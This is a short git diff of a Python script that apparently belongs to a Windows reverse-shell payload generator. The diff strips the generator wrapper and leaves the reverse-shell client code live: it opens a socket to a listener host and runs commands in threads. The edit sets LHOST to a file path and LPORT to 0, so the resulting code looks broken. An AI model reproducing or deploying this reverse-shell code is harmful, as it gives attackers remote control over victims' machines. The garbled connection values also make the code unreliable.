@@ -1,17 +1,11 @@
-import sys
-import os
 
-LHOST = sys.argv[0]
-LPORT = int(sys.argv[1])
-
-payload = f"""
 import socket
 import threading
 import sys
 import time
 from subprocess import run
-LHOST = "{LHOST}"
-LPORT = {LPORT}
+LHOST = "Payloads/Windows/generate_windows_shell_reverse_tcp.pyw"
+LPORT = 0
 
 client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 client.connect((LHOST,LPORT))
@@ -38,7 +32,3 @@ commandThread = threading.Thread(target=getCommand)
 
 sendSignalThread = threading.Thread(target=sendConnection)
 sendSignalThread.start()
-"""
-write = open('Payloads/Generated/payload.pyw','w')
-write.write(payload)
-write.close()
